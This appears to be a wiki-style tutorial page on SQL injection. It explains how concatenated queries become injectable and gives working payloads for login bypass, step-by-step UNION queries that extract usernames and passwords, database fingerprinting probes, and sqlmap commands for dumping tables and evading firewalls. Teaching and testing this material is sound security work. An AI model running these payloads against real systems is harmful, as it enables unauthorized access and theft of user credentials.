# SQL Injection — Overview

**Overview** | [[Error-Based-SQLi]] | [[Blind-SQLi]] | [[SQLi-to-RCE]]

---

SQL injection is when user input is inserted into a SQL query without proper sanitization, letting the attacker manipulate the query logic. It's been in the OWASP Top 10 since the list was created and still shows up everywhere.

---

## How It Happens

```python
# Vulnerable — string concatenation
query = "SELECT * FROM users WHERE username = '" + username + "'"

# Input: admin'--
# Result: SELECT * FROM users WHERE username = 'admin'--'
# The -- comments out the rest → bypasses password check
```

The database can't tell the difference between your query structure and attacker-supplied data, because they're the same string.

---

## SQLi Categories

| Category | How results come back | Notes |
|----------|----------------------|-------|
| **In-band** | Response contains query output | Easiest to exploit |
| Error-based | Database error message reveals data | See [[Error-Based-SQLi]] |
| UNION-based | Extra SELECT appended, results returned | Most common in-band technique |
| **Blind** | No visible output, infer from behavior | Slower, harder |
| Boolean-based | True/false responses differ | See [[Blind-SQLi]] |
| Time-based | `SLEEP()` to infer true/false | See [[Blind-SQLi]] |
| **Out-of-band** | Data exfiltrated via DNS/HTTP request | Rare, needs specific DB features |

---

## Detection

### Basic Probes

```sql
'           -- single quote → SQL syntax error?
''          -- escaped quote → is error gone?
' OR '1'='1 -- always true
' OR '1'='2 -- always false → different response than above?
```

Positive signals:
- SQL error message in the response
- Different response for true vs false condition
- Longer response time with `' AND SLEEP(5)--`
- Missing or extra data in the response

### Where to Test

Every input that reaches the database:
- GET/POST parameters (`?id=1`, `?category=electronics`)
- HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`)
- JSON/XML body fields
- Search boxes, login forms, filters, sorting parameters

---

## Authentication Bypass (Classic)

```sql
-- Login query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

-- Payload in username field:
admin'--
-- Result: SELECT * FROM users WHERE username='admin'--' AND password='...'
-- Password check commented out → logs in as admin

-- Alternative (when username unknown):
' OR '1'='1'--
-- Result: SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='...'
-- Returns first user in the table
```

---

## UNION-Based Injection

UNION appends results from an additional SELECT. Use it to read from other tables.

### Step 1 — Find Number of Columns

```sql
' ORDER BY 1--    ← no error
' ORDER BY 2--    ← no error
' ORDER BY 3--    ← error! → 2 columns
```

Or:
```sql
' UNION SELECT NULL--          ← error
' UNION SELECT NULL,NULL--     ← no error → 2 columns
```

### Step 2 — Find Which Columns Are Displayed

```sql
' UNION SELECT 'a',NULL--   ← does 'a' appear in the response?
' UNION SELECT NULL,'a'--   ← or this?
```

### Step 3 — Extract Data

```sql
-- MySQL: list databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- List tables in current database
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- List columns in a table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Dump users
' UNION SELECT username,password FROM users--
```

---

## Database Identification

Different databases have slightly different syntax. Identifying the DB type lets you use the right payloads.

| Probe | MySQL | MSSQL | PostgreSQL | Oracle |
|-------|-------|-------|-----------|--------|
| `SELECT @@version` | ✅ | ✅ | ❌ | ❌ |
| `SELECT version()` | ✅ | ❌ | ✅ | ❌ |
| `SELECT * FROM v$version` | ❌ | ❌ | ❌ | ✅ |
| String concat | `'a' 'b'` | `'a'+'b'` | `'a'||'b'` | `'a'||'b'` |
| Comment | `-- -` or `#` | `--` | `--` | `--` |

---

## Second-Order SQLi

Payload is stored (not immediately executed), then retrieved and used in a query later.

```
1. Register with username: admin'--
2. The registration stores it safely (parameterized)
3. Later: "Update profile WHERE username = '" + username + "'"
4. The stored malicious username is now injected in the second query
```

Hard to find with automated scanners. Requires understanding the app's data flows.

---

## Tools

```bash
# sqlmap — automated detection and exploitation
sqlmap -u "https://example.com/page?id=1" --batch --level=3 --risk=2

# Specific database
sqlmap -u "https://example.com/page?id=1" --dbms=mysql --dbs

# Dump a table
sqlmap -u "https://example.com/page?id=1" -D mydb -T users --dump

# From Burp request file
sqlmap -r request.txt --batch

# Tamper scripts for WAF bypass
sqlmap -u "https://example.com/?id=1" --tamper=space2comment,charunicodeencode
```

---

## Deep Dives

- [[Error-Based-SQLi]] — extracting data via error messages
- [[Blind-SQLi]] — boolean and time-based when there's no visible output
- [[SQLi-to-RCE]] — escalating SQLi to code execution

---

*Related: [[A03-Injection]] | [[SQLi-Payloads]] cheatsheet*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4*
